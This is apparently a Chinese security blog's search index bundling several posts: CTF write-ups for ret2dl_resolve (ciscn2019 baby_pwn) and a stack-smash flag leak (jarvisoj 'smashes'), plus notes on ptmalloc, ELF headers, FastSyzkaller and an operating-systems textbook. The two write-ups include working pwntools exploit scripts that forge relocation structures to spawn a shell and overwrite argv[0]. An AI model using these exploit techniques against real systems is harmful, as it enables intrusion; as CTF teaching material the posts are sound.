{"pages":[{"title":"android","text":"","link":"/android/index.html"},{"title":"fuzz","text":"","link":"/fuzz/index.html"},{"title":"ctf","text":"","link":"/ctf/index.html"},{"title":"linux","text":"","link":"/linux/index.html"},{"title":"notes","text":"","link":"/notes/index.html"}],"posts":[{"title":"ret2dl_resolve(ciscn2019_pwn)","text":"ret2_dl_runtime_solve 因为之前并没有完整地整理复现ret2dl_resolve这个知识点, 所以特意另开一篇, 借这道题顺便理清思路 ELF关于动态链接的一些关键的section 这里提一下section和segment的区别: 前者是目标代码文件的组成部分, 后者是可执行文件的组成部分. 分别使用readelf -S和readelf -l查看, 具体请看我关于ELF文件解析的文章. 注: readelf -S可以查看所有节的地址, 其中类型位REL的节区包含重定位表项.节中包含目标文件的所有信息,节的结构如下: 123456789101112typedef struct { Elf32_Word sh_name; // 节头部字符串表节区的索引 Elf32_Word sh_type; // 节类型 Elf32_Word sh_flags; // 节标志，用于描述属性 Elf32_Addr sh_addr; // 节的内存映像 Elf32_Off sh_offset; // 节的文件偏移 Elf32_Word sh_size; // 节的长度 Elf32_Word sh_link; // 节头部表索引链接 Elf32_Word sh_info; // 附加信息 Elf32_Word sh_addralign; // 节对齐约束 Elf32_Word sh_entsize; // 固定大小的节表项的长度} Elf32_Shdr; .dynamic ELF可执行文件由ELF头部，程序头部表和其对应的段，节头部表和其对应的节组成。如果一个可执行文件参与动态链接，它的程序头部表将包含类型为PT_DYNAMIC的段，它包含.dynamic节。结构如下：1234567typedef struct { Elf32_Sword d_tag; union { Elf32_Word d_val; Elf32_Addr d_ptr; } d_un;} Elf32_Dyn; 其中Tag对应这每个节.比如JMPREL对应.ret.plt (ELF JMPREL Relocation Table) 也可以适合用readelf -d 的命令查看. .rel.plt 重定位表，也是一个结构体数组，每个项对应一个导入函数。结构体定义如下： 12345678910111213typedef struct{ Elf32_Addr r_offset; //指向GOT表的指针,对于可执行文件,此值为虚拟地址 Elf32_Word r_info; //符号表索引 //一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07 //1,2,4,5是这个导入函数的符号在.dynsym中的下标， //如果往回看的话你会发现这些数字刚好和.dynsym的各个函数位置相对应} Elf32_Rel;#define ELF32_R_SYM(info) ((info)&gt;&gt;8)#define ELF32_R_TYPE(info) ((unsigned char)(info))#define ELF32_R_INFO(sym, type) (((sym)&lt;&lt;8)+(unsigned char)(type)) 也可通过readelf -r来获取相关信息,其中.rel.plt节是用于函数重定位，.rel.dyn节是用于变量重定位 .got节保存全局变量偏移表，.got.plt节保存全局函数偏移表。.got.plt对应着Elf32_Rel结构中r_offset的值 .dynsym 是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。.dynsym节包含了动态链接符号表。Elf32_Sym[num]中的num对应着ELF32_R_SYM(Elf32_Rel-&gt;r_info)。根据定义，1ELF32_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt;r_info) &gt;&gt; 8其实就是直接看从第二个字节开始的值 结构体定义如下123456789typedef struct{ Elf32_Word st_name; //Symbol name(string tbl index) 符号名，是相对.dynstr起始地址的偏移 Elf32_Addr st_value; Elf32_Word st_size; unsigned char st_info; //Symbol type and binding 对于导入函数符号而言，它是0x12 unsigned char st_other; Elf32_Section st_shndx;// Section index}Elf32_Sym; //对于导入函数符号而言，其他字段都是0 可以使用readelf -s 查看 根据上面我们可以知道read的ELF32_R_SYM(0x107), 所以应该是Elf32_Sym[1]即保存着read的符号表信息。并且ELF32_R_TYPE(0x607) = 7，对应R_386_JUMP_SLOT。 .dynstr 一个字符串表，index为0的地方永远是0，然后后面是动态链接所需的字符串，0结尾，包括导入函数名，比方说这里很明显有个read。到时候，相关数据结构引用一个字符串时，用的是相对这个section头的偏移,在这里就是对0804827C的偏移.Elf32_Sym[1]-&gt;st_name=0x20（调试方法.dynsym + Elf32_Sym_size * num），所以.dynstr加上0x20的偏移量，就是字符串write。 .plt .plt节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置。 执行read@plt的时候,就会跳到0x804a00c去执行. 延迟绑定 先贴张有意思的图 来看刚才那三行汇编代码, 第一行：前面提到过0x804a00c是read的GOT表位置，当我们第一次调用read时，其对应的GOT表里并没有存放read的真实地址，而是read@plt的下一条指令地址。 第二、三行：把reloc_arg=0x0作为参数推入栈中，跳到0x08048380（PLT[0]）继续执行. 0x08048380（PLT[0]）再把link_map=(GOT+4)（即GOT[1]，链接器的标识信息）作为参数推入栈中，而(GOT+8)（即GOT[2]，动态链接器中的入口点）中保存的是_dl_runtime_resolve函数的地址。因此以上指令相当于执行了_dl_runtime_resolve(link_map, reloc_arg)，该函数会完成符号的解析，即将真实的read函数地址写入其GOT条目中，随后把控制权交给read函数。 _dl_runtime_resolve是在glibc-2.23/sysdeps/i386/dl-trampoline.S中用汇编实现的。0xf7feae1b处即调用_dl_fixup，并且通过寄存器传参。 _dl_fixup是在glibc-2.23/elf/dl-runtime.c实现的，这里只列出一些主要函数。123456789101112131415_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg){ // 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); // 然后通过reloc-&gt;r_info找到.dynsym中对应的条目 const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]; // 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7 assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); // 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址 result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL); // value为libc基址加上要解析函数的偏移地址，也即实际地址 value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0); // 最后把value写入相应的GOT表条目中 return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);} _dl_runtime_resolve具体调用顺序 用link_map访问.dynamic，取出.dynstr, .dynsym, .rel.plt的指针 .rel.plt + 第二个参数求出当前函数的重定位表项Elf32_Rel的指针，记作rel rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym .dynstr + sym-&gt;st_name得出符号名字符串指针 在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表 调用这个函数 漏洞利用方式 漏洞利用方式 控制eip为PLT[0]的地址，只需传递一个index_arg参数 控制index_arg的大小，使reloc的位置落在可控地址内 伪造reloc的内容，使sym落在可控地址内 伪造sym的内容，使name落在可控地址内 伪造name为任意库函数，如system baby_pwn checksec具体利用思路: 操纵第二个参数，使其指向我们所构造的Elf32_Rel 因为开了RELRO, 所以.dynamic不可写, 前面的_dl_runtime_resolve在第二步时 .rel.plt + 第二个参数求出当前函数的重定位表项Elf32_Rel的指针，记作rel 这个时候，_dl_runtime_resolve并没有检查.rel.plt + 第二个参数后是否造成越界访问，所以我们能给一个很大的.rel.plt的offset（64位的话就是下标），然后使得加上去之后的地址指向我们所能操纵的一块内存空间，比方说.bss。 然后第三步 rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym 所以在我们所伪造的Elf32_Rel，需要放一个r_info字段，大概长这样就行0xXXXXXX07，其中XXXXXX是相对.dynsym表的下标，注意不是偏移，所以是偏移除以Elf32_Sym的大小，即除以0x10（32位下）。然后这里同样也没有进行越界访问的检查，所以可以用类似的方法，伪造出这个Elf32_Sym。至于为什么是07，因为这是一个导入函数，而导入函数一般都是07，所以写成07就好。 然后第四步 .dynstr + sym-&gt;st_name得出符号名字符串指针 同样类似，没有进行越界访问检查，所以这个字符串也能够伪造。 我们需要做的就是在使调用函数的整个过程被我们所控制，首先劫持栈： 1payload+= p32(pop_rbp) + p32(mystack) + p32(leave_ret) 然后需要在栈上布置这种结构： 123456789payload = p32(mystack)payload+= p32(plt_0_addr)payload+= p32(fake_index)payload+= p32(ret_addr)payload+= p32(arguments)payload+= fake_relpayload+= fake_sympayload = payload.ljust(0x80,’x00’)payload+= fake_str 之后我们要做的事分三步：1.伪造fake_index来使程序跳入我们自己的fake_rel结构体2.构造fake_rel的r_info来使程序跳到我们自己的fake_sym结构体 (这里需要我们自己来构造字节对齐。)3.构造fake_sym结构体的st_name来使程序跳到我们自己的fake_str字符串。其中fake_index，fake_rel，fake_sym，fake_str的地址都需要我们自己能够精确地控制。（栈注意迁移即可） exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#coding:utf-8from pwn import *context(os='linux',arch='i386')#context.log_level = 'debug'p = process('./pwn')P = ELF('./pwn')lr = 0x08048448bss = 0x0804aa00pppr_addr = 0x080485d9pop_ebp = 0x080485dbpayload = (0x28+4) * 'a'payload+= p32(P.plt['read'])payload+= p32(pppr_addr)payload+= p32(0)payload+= p32(bss) payload+= p32(0x400)payload+= p32(pop_ebp)payload+= p32(bss)payload+= p32(lr)p.send(payload)sleep(1)plt_0 = 0x08048380r_info = 0x107rel_plt = 0x0804833c dynsym = 0x080481dcdynstr = 0x0804827cfake_sys_addr = bss + 36align = 0x10 - ((fake_sys_addr-dynsym)&amp;0xf)fake_sys_addr = fake_sys_addr + alignindex = (fake_sys_addr - dynsym)/0x10r_info = (index &lt;&lt; 8) + 0x7st_name = (fake_sys_addr + 0x10) - dynstrfake_sys = p32(st_name) + p32(0) + p32(0) + p32(0x12) fake_rel = p32(P.got['read']) + p32(r_info)fake_rel_addr = bss + 28fake_index = fake_rel_addr - rel_plt payload = p32(bss)payload+= p32(plt_0)payload+= p32(fake_index)payload+= p32(0xdeadbeef)payload+= p32(bss+0x80)payload+= p32(0)payload+= p32(0)payload+= fake_relpayload+= 'a'*alignpayload+= fake_syspayload+= 'system'payload = payload.ljust(0x80,'\\x00')payload+= '/bin/sh\\x00'p.sendline(payload)p.interactive() 这是大佬的exp…看完感觉又学到好多… 大佬的连接 http://pwn4.fun/2016/11/09/Return-to-dl-resolve/ https://zhuanlan.zhihu.com/p/37572651 https://www.anquanke.com/post/id/177035","link":"/2019/06/03/2016-06-03-ret2dl-resolve/"},{"title":"模糊测试syzkaller项目之FastSyzkaller","text":"FastSyzkaller: 提高Linux内核模糊测试的模糊效率的工具 此文只是对原文含义的提取, 英文原文在这里https://iopscience.iop.org/article/10.1088/1742-6596/1176/2/022013/pdf 简要来说本文提出了FastSyzkaller，它将Syzkaller与N-Gram模型结合在一起，以优化测试用例生成过程，提高模糊效率。因为本文有一部分在介绍syzkaller的使用,而具体syzkaller的运作方法请参考usages文档下的使用方法, 这里就不再累述了。 N-Gram模型广泛且主要用于自然语言工具包，计算语言学和概率领域。 通过从文本或语料库中收集，该论文的项目拥有一系列连续的项目，这些项目可以分为n-gram元组。 在本文中，N-Gram模型用于提取易受攻击的系统调用模式。 作者的目标是在可能易受攻击的实际执行跟踪中对N-Gram顺序系统调用模式进行格式化，以便在模糊测试过程中指导测试用例生成阶段，并进一步提高内核模糊效率 注: 易受攻击的程序行为可以部分地由一系列系统调用来表示，在本文中也称为易受攻击的模式。 FastSyzkaller与Syzkaller的区别 为了在每个测试用例中保持易受攻击的系统调用模式的顺序，FastSyzkaller只能在给定测试输入后插入具有高优先级的合理系统调用，或者在改变现有测试用例时更改系统调用的参数。 更重要的是，它不能删除或改变系统调用序列中任何给定的系统调用，以免更改易受攻击的系统调用模式的顺序。 通过以作者定义的方式生成测试用例，我们可以确保新生成的FastSyzkaller测试用例包含预先学习的N-Gram易受攻击的系统调用模式，以提高Syzkaller的Linux内核模糊测试效率。 更重要的是，FastSyzkaller仍然可以向测试用例插入新的系统调用，并更改参数以改善其系统调用多样性和覆盖范围。 在相同条件情况下,fastskyzller的效率要明显高于syzkaller 具体例子 在表1中显示了崩溃程序中排名前十的易受攻击的5-gram模式。 在表2列出了非崩溃程序中的前10个正常5-gram模式。 作者使用选择5作为调用链长度是因为, 在做前期准备工作时, 分别对这些N-Gram模式进行统计分析，发现当n设置为5时，易受攻击模式的数据分布在所有选择中分布更均匀。 这里可以看出可以看到大多数易受攻击的模式包含与setsockopt（）函数相关的系统调用,所以它是易受攻击模式的一环的可能性比较大。而ioctl（）系统调用函数也会以正常5-gram模式出现多次,所以它的可能性较小。 总结在本文中，作者利用N-Gram模型提取易受攻击的系统调用模式，并提出FastSyzkaller以提高Linux内核模糊效率。 通过使用开源的Linux kernel目标模糊测试工具Syzkaller，在所有测试输入中收集了顺序系统调用模式，并利用N-Gram模型来处理这些数据。 他们将这些易受攻击的模式组合成FastSyzkaller作为给定的语料库，以便它可以基于预定义的易受攻击的模式生成新的测试用例。 它可以提高触发崩溃时的模糊效率。 此外，建立了实验并进行了评估，以便将FastSyzkaller与Syzkaller进行比较。 结果表明，FastSyzkaller在两种碰撞类型以及总碰撞量和模糊效率方面的性能提高了3倍。 FastSyzkaller还暴露出比Syzkaller更珍贵的独特碰撞类型。","link":"/2019/05/03/2019-05-03-FastSyzkaller/"},{"title":"内存管理小结","text":"最近在快看完OPERATING SYSTEM:THREE EASY PIECES这本书了,然后在关于内存管理方面认识存在些许问题,就写了这篇总结, 也算是对pwn的堆题做一些准备 借鉴学习引用 https://www.ibm.com/developerworks/cn/linux/l-memory/index.htmlhttp://www.cnhalo.net/2016/06/13/memory-optimize/ 内存的管理层次–分为三层,从底层向上 操作系统内核的内存管理 glibc层使用系统维护的内存管理 应用程序从glibc动态分配内存后，根据应用程序本身的程序特性进行优化， 比如使用引用计数std::shared_ptr，apache的内存池方式等 注: 应用程序可以直接使用系统调用从内核分配内存 现在比较流行的有ptmalloc、tcmalloc和jemalloc等.但因为pwn题基本上都是glibc的,所以接下来暂时只分析glibc的ptmalloc(现在是ptmalloc2),以后有需要时再补充. ptmalloc原理系统调用接口 上图是 x86_64 下 Linux 进程的默认地址空间, 对 heap 的操作, 操作系统提供了brk()系统调用，设置了Heap的上边界； 对 mmap 映射区域的操作,操作系 统 供了 mmap()和 munmap()函数。因为系统调用的代价很高，不可能每次申请内存都从内核分配空间，尤其是对于小内存分配。 而且因为mmap的区域容易被munmap释放，所以一般大内存采用mmap()，小内存使用brk()。 这两个系统调用可以看作是连接内核层的内存管理和glibc层的内存管理的桥梁,但注意这都是基于UNIX系统的. 多线程的支持 ptmalloc2 一个主分配区,多个非主分配区,非主分配区只能使用mmap向操作系统批发申请HEAP_MAX_SIZE（64位系统为64MB）大小的虚拟内存。 当某个线程调用malloc的时候，会先查看线程私有变量中是否已经存在一个分配区，如果存在则尝试加锁，如果加锁失败则遍历arena链表试图获取一个没加锁的arena， 如果依然获取不到则创建一个新的非主分配区。 free()的时候也要获取锁。分配小块内存容易产生碎片，ptmalloc在整理合并的时候也要对arena做加锁操作。在线程多的时候，锁的开销就会增大。 ptmalloc的内存管理 用户请求分配的内存在ptmalloc中使用chunk表示， 每个chunk至少需要8个字节额外的开销。 用户free掉的内存不会马上归还操作系统，ptmalloc会统一管理heap和mmap区域的空闲chunk，避免了频繁的系统调用。 ptmalloc 将相似大小的 chunk 用双向链表链接起来, 这样的一个链表被称为一个 bin。Ptmalloc 一共 维护了 128 个 bin,并使用一个数组来存储这些 bin. 数组中的第一个为 unsorted bin, 数组中从 2 开始编号的前 64 个 bin 称为 small bins, 同一个small bin中的chunk具有相同的大小。small bins后面的bin被称作large bins. 当free一个chunk并放入bin的时候， ptmalloc 还会检查它前后的 chunk 是否也是空闲的, 如果是的话,ptmalloc会首先把它们合并为一个大的 chunk, 然后将合并后的 chunk 放到 unstored bin 中。 另外ptmalloc 为了提高分配的速度,会把一些小的(不大于64B) chunk先放到一个叫做 fast bins 的容器内。 在fast bins和bins都不能满足需求后，ptmalloc会设法在一个叫做top chunk的空间分配内存。 对于非主分配区会预先通过mmap分配一大块内存作为top chunk， 当bins和fast bins都不能满足分配需要的时候, ptmalloc会设法在top chunk中分出一块内存给用户, 如果top chunk本身不够大, 分配程序会重新mmap分配一块内存chunk, 并将 top chunk 迁移到新的chunk上，并用单链表链接起来。如果free()的chunk恰好 与 top chunk 相邻,那么这两个 chunk 就会合并成新的 top chunk，如果top chunk大小大于某个阈值才还给操作系统。主分配区类似，不过通过sbrk()分配和调整top chunk的大小，只有heap顶部连续内存空闲超过阈值的时候才能回收内存。 需要分配的 chunk 足够大,而且 fast bins 和 bins 都不能满足要求,甚至 top chunk 本身也不能满足分配需求时,ptmalloc 会使用 mmap 来直接使用内存映射来将页映射到进程空间。 ptmalloc的分配流程 ptmalloc的缺陷 后分配的内存先释放,因为 ptmalloc 收缩内存是从 top chunk 开始,如果与 top chunk 相邻的 chunk 不能释放, top chunk 以下的 chunk 都无法释放. 多线程锁开销大， 需要避免多线程频繁分配释放 内存从thread的arena中分配， 内存不能从一个arena移动到另一个arena， 就是说如果多线程使用内存不均衡，容易导致内存的浪费。 比如说线程1使用了300M内存，完成任务后glibc没有释放给操作系统，线程2开始创建了一个新的arena， 但是线程1的300M却不能用了","link":"/2019/05/05/2019-05-01-nei-cun-guan-li/"},{"title":"ELF文件解析二","text":"ELF headerELF header的定义可以在 /usr/include/elf.h 中找到。Elf32_Ehdr是32位 ELF header的结构体。Elf64_Ehdr是64位ELF header的结构体。 1234567891011121314151617181920212223242526272829303132333435typedef struct{ unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf32_Half e_type; /* Object file type */ Elf32_Half e_machine; /* Architecture */ Elf32_Word e_version; /* Object file version */ Elf32_Addr e_entry; /* Entry point virtual address */ Elf32_Off e_phoff; /* Program header table file offset */ Elf32_Off e_shoff; /* Section header table file offset */ Elf32_Word e_flags; /* Processor-specific flags */ Elf32_Half e_ehsize; /* ELF header size in bytes */ Elf32_Half e_phentsize; /* Program header table entry size */ Elf32_Half e_phnum; /* Program header table entry count */ Elf32_Half e_shentsize; /* Section header table entry size */ Elf32_Half e_shnum; /* Section header table entry count */ Elf32_Half e_shstrndx; /* Section header string table index */} Elf32_Ehdr;typedef struct{ unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf64_Half e_type; /* Object file type */ Elf64_Half e_machine; /* Architecture */ Elf64_Word e_version; /* Object file version */ Elf64_Addr e_entry; /* Entry point virtual address */ Elf64_Off e_phoff; /* Program header table file offset */ Elf64_Off e_shoff; /* Section header table file offset */ Elf64_Word e_flags; /* Processor-specific flags */ Elf64_Half e_ehsize; /* ELF header size in bytes */ Elf64_Half e_phentsize; /* Program header table entry size */ Elf64_Half e_phnum; /* Program header table entry count */ Elf64_Half e_shentsize; /* Section header table entry size */ Elf64_Half e_shnum; /* Section header table entry count */ Elf64_Half e_shstrndx; /* Section header string table index */} Elf64_Ehdr; 64位和32位只是个别字段长度不同，比如 Elf64_Addr 和 Elf64_Off 都是64位无符号整数。而Elf32_Addr 和 Elf32_Off是32位无符号整数。这导致ELF header的所占的字节数不同。32位的ELF header占52个字节，64位的ELF header占64个字节. ELF header 详解 e_ident占16个字节。前四个字节被称作ELF的Magic Number。后面的字节描述了ELF文件内容如何解码等信息。 e_type，2字节，描述了ELF文件的类型。以下取值有意义：12345678ET_NONE, 0, No file typeET_REL, 1, Relocatable file（可重定位文件，通常是文件名以.o结尾，目标文件）ET_EXEC, 2, Executable file （可执行文件）ET_DYN, 3, Shared object file （动态库文件)）ET_CORE, 4, Core file （core文件)ET_NUM, 5，(表示已经定义了5种文件类型)ET_LOPROC, 0xff00, Processor-specificET_HIPROC, 0xffff, Processor-specific 从ET_LOPROC到 ET_HIPROC 的值，包含特定于处理器的语义。 e_machine，2字节。描述了文件面向的架构，可取值如下（因为文档较老，现在有更多取值，参见/usr/include/elf.h中的EM_开头的宏定义）：123456789EM_NONE, 0, No machineEM_M32, 1, AT&amp;T WE 32100EM_SPARC, 2, SPARCEM_386, 3, Intel 80386EM_68K, 4, Motorola 68000EM_88K, 5, Motorola 88000EM_860, 7, Intel 80860EM_MIPS, 8, MIPS RS3000... ... e_version，2字节，描述了ELF文件的版本号，合法取值如下：123EV_NONE, 0, Invalid versionEV_CURRENT, 1, Current version，EV_NUM, 2, (表示已经定义了2种版本号) e_entry，（32位4字节，64位8字节），执行入口点，如果文件没有入口点，这个域保持0。 e_phoff, （32位4字节，64位8字节），program header table的offset，如果文件没有PH，这个值是0。 e_shoff, （32位4字节，64位8字节）， section header table 的offset，如果文件没有SH，这个值是0。 e_flags, 4字节，特定于处理器的标志，32位和64位Intel架构都没有定义标志，因此eflags的值是0。 e_ehsize, 2字节，ELF header的大小，32位ELF是52字节，64位是64字节。 e_phentsize，2字节。program header table中每个入口的大小。 e_phnum, 2字节。如果文件没有program header table, e_phnum的值为0。e_phentsize乘以e_phnum就得到了整个program header table的大小。 e_shentsize, 2字节，section header table中entry的大小，即每个section header占多少字节。 e_shnum, 2字节，section header table中header的数目。如果文件没有section header table, e_shnum的值为0。e_shentsize乘以e_shnum，就得到了整个section header table的大小。 e_shstrndx, 2字节。section header string table index. 包含了section header table中section name string table。如果没有section name string table, e_shstrndx的值是SHN_UNDEF. e_ident如图，前4个字节是ELF的Magic Number，固定为7f 45 4c 46。第5个字节指明ELF文件是32位还是64位的。第6个字节指明了数据的编码方式，即我们通常说的little endian或是big endian。little endian第7个字节指明了ELF header的版本号，目前值都是1。第8-16个字节，都填充为0。 readelf读取ELF header我们使用readelf -h 可以读取文件的ELF header信息。比如我本地有执行文件hello，我执行readelf -h hello，结果例如： 1234567891011121314151617181920ELF Header: Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 Class: ELF64 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: DYN (Shared object file) Machine: Advanced Micro Devices X86-64 Version: 0x1 Entry point address: 0x1050 Start of program headers: 64 (bytes into file) Start of section headers: 14768 (bytes into file) Flags: 0x0 Size of this header: 64 (bytes) Size of program headers: 56 (bytes) Number of program headers: 11 Size of section headers: 64 (bytes) Number of section headers: 29 Section header string table index: 28","link":"/2019/06/05/2016-06-05-elf-fs-2/"},{"title":"stack smash","text":"jarvisoj pwn smashes checksec开启了NX和Canary 比较明显我们可利用的点时_IO_gets函数, 那基本的思路就是Stack Smash. 我们知道, 当程序开启了Canary后, 如果把该值覆盖, 程序报错时,触发_stack_chk_fail函数, 最终会输出argv[0]的信息. 12345678910void __attribute__ ((noreturn)) __stack_chk_fail (void){ __fortify_fail (\"stack smashing detected\");}void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg){ /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"&lt;unknown&gt;\");} 所以，我们要将覆盖argv[0]为flag，那么在输出报错信息时，就成功的泄露了flag的值, 所要知道的是: 偏移：从可以输入的栈指针到argv[0]的偏移值，即为我们需要填充的(当然还有一种暴力覆盖的方法,你懂的) flag的地址：将argv[0]修改成flag的地址 偏移值 查看argv[0]的栈偏移, 可以看出argv[0]地址为0x7fffffffdf18 计算出偏移 在_IO_gets前下断点, 查看其esp 所以偏移值 0x218 这里直接使用flag的地址写exp是错误的, 因为这里有一个memset, 具体原因自寻. 所以我们在memset前下断点 查询cccc, 发现0x600d20处的flag被覆盖了(ps: pwndbg调不出来,换了peda就行了…) 寻找没有被覆盖的flag值 利用构造exp exp123456789101112131415#!/usr/bin/env python# coding=utf-8from pwn import *#sh = process('./stack_smashes')sh = remote(\"pwn.jarvisoj.com\", 9877) offset = 0x218flag_addr = 0x400d20payload = 'A' * offset + p64(flag_addr)#暴力破解的话就全填flag地址...)sh.recvuntil(\"name? \")sh.sendline(payload)sh.interactive() 本地跑出来那个unknow值就是argv[0]","link":"/2019/05/24/2019-05-24-stack-smashes/"},{"title":"operating_system_three_easy_pieces","text":"这本书脉络很清晰,介绍的知识点也比较全面,分为三大模块(虚拟,并行,持久)来展开.而且英文内容也比较好理解,对准备学习操作系统的朋友还是比较推荐此书的.这里有一些同学正在进行中文翻译的工作,友情链接https://github.com/EmbedXj/OperatingSystems.ThreeEasyPieces 这篇博客只是针对我自己一些理解不深的和容易忘记的知识点做一个整理备份,用于以后的深入,并给准备阅读这本书的读者一个简要参考,具体内容就不展开了(实在是太多了orz….),本人初涉操作系统,关键点可能不能准确把握,见谅. 一二章是简单地介绍了三大模块的基本要点. 三四两章较简略地介绍了虚拟哈所涉及到的知识块,没有特别新的知识点,就不写了,基本看过csapp这本书的朋友都能理解. 第五章 进程API## 这里有一个点我看了翻译才确定书中的意思, 就是哪怕父进程先调用了, 因为它立即调用了wait()的system call, 所以一定会等到一个触发点(暂且这么理解吧)才能返回, 而这个出发点不能时父进程本身, 那只能是子进程的运行和结束, 所以不论如何都是子进程先打印,其次是父进程. fork()是同一程序产生动态的复制版本, 而exec()是将当前的程序转换为另一个程序且不返回,这意味着在exec之后的且属于同一进程的语句不会得到执行, exec()有六个子版本:execl(),execle(),execlp(),execv(),execvp()(具体抽空再补) strdup()功能:将串拷贝到新建的位置处, 其内部调用了malloc为变量分配内存,需要用free()释放相应的内存空间. shell被允许在调用fork（）之后但在调用exec（）之前运行代码 第六章 机制:有限的直接执行 虚拟化机制需要注意考虑性能和控制两点. 本章介绍了陷阱这一概念,它是用于不同系统状态间的切换的一种机制. 很好地将进程切换,内核与用户状态切换,操作系统三者结合起来讨论,比较清晰的梳理了三者之间的关系(相互依存,相互影响 ;-) 除此之外,作者所用的例子是基于xv6操作系统,所以一些代码会和之前的理解哟所出入,建议读者在阅读完此书后去学习MIT6.828这门课程,它就是通过对xv6全方面的剖析让你理解操作系统的各个核心部分. 第七章 调度:简介 本章的调度策略,介绍了周转时间这一概念.然后通过类似递进的方式介绍在调度方面的各类算法.First In, First Out (FIFO),Shortest Job First (SJF),Shortest Time-to-Completion First (STCF).以及其他的调度策略 Round Robin(RR)和Incorporating I/O等.此章结合对进程,线程,并行等的知识点理解会更透彻. 注： 后续很多章节的结构也和本章很类似,作者习惯于先介绍一个较为基础的模型,然后不断的 (抛出问题–&gt;提出新模型) 这一方式来展开. 第八章 调度:多级反馈队列 本章是对上一章的另一个方面的拓展, 引入了优先级这一概念,描述了称为多级反馈队列（MLFQ）的调度方法。 它有多个级别的队列，并使用反馈来确定给定作业的优先级。历史是它的指南：注意工作随着时间的推移如何表现并相应地对待它们 第九章 调度:比例分配 本章介绍了比例共享调度的概念(个人认为是将优先级比例化的一个方式)，并简要讨论了两种实现：彩票(谷歌翻译是这个2333…)和步幅调度。彩票以巧妙的方式使用随机性来实现比例分配; 步伐确实如此。虽然两者在概念上都很有趣，但由于各种原因，它们还没有作为CPU调度程序得到广泛采用。一个是这种方法并不特别地与I / O 啮合;另一个问题是，他们是否解决了机票分配的难题，即我们如何知道浏览器应分配多少票？通用调度程序更加优雅，因此可以更广泛地部署。因此，比例共享调度程序在某些问题的域中更有用相对容易解决。 第十章 多处理器调度 此章可以说是对并行化的一方面做了一个介绍,其实在csapp后面的章节也有介绍,其余的并行运算也会对此做出更为详细的讲解. 在本章看到了多处理器调度的各种方法。单队列方法（SQMS）可以很容易地构建和平衡负载，但本身很难扩展到许多处理器和缓存的可靠性。多队列方法（MQMS）可以更好地扩展并且很好地处理缓存效率，但是在负载不平衡方面存在问题并且更加复杂。 无论采用哪种方法，都没有简单的答案：构建通用调度程序仍然是一项艰巨的任务，因为小代码更改可能会导致较大的行为差异。(比如说你能够写出发挥自己电脑95%以上的性能吗…) 第十三章 抽象:地址空间 本章没什么新知识点…简单介绍了一个主要的OS子系统：虚拟内存。 VM系统负责向程序提供大型，稀疏的私有地址空间的错觉，程序将所有指令和数据保存在其中。 具有一些硬件帮助的操作系统将采用这些虚拟内存引用中的每一个，并将它们转换为物理地址，这些物理地址可以呈现给物理内存以便获取所需信息。 操作系统将立即为许多进程执行此操作，确保程序彼此保护，以及保护操作系统。 整个方法需要大量的机制（许多低级机制）以及一些重要的工作策略; 第十四章 内存API 这一章介绍了一些处理内存分配的API(大家都知道的那些…),所以没什么好介绍的。具体关于内存分配的知识点大家可以阅读我博客的一些关于内存知识点的整理. 第十五章 机制:地址翻译 在本章中，使用虚拟内存中使用的特定机制（称为地址转换）扩展了有限直接执行的概念。通过地址转换，操作系统可以控制进程的每个内存访问，确保访问保持在地址空间的范围内。这种技术的效率的关键是硬件支持，它为每次访问快速执行转换，将虚拟地址（进程的内存视图）转换为物理地址（实际视图）。所有这些都是以对已重新定位的流程透明的方式执行的;这个过程不知道它的记忆参考被翻译，造成一种奇妙的错觉。还介绍了一种特定的虚拟化形式，称为基本和边界或动态重定位。基础和边界虚拟化非常有效，因为只需要更多的硬件逻辑就可以将基址寄存器添加到虚拟地址，并检查进程生成的地址是否在边界内。基地和边界也提供保护;操作系统和硬件相结合，确保没有进程可以在自己的地址空间之外生成内存引用。保护当然是操作系统最重要的目标之一;没有它，操作系统无法控制机器（如果进程可以自由覆盖内存，那就说明可以覆盖陷阱表并接管系统orz…）。但是，这种简单的动态重定位技术存在效率低下的问题（如内部碎片等）。 这一章节的知识点还是需要读者自己去深入，查阅其他的相关资料会加深对此的理解。 第十六章 分段 终于来到segmentation了哈。是不是有时在linux命令行里运行程序的时候会报错segmentation fault？看完这章会对此理解更加深刻。 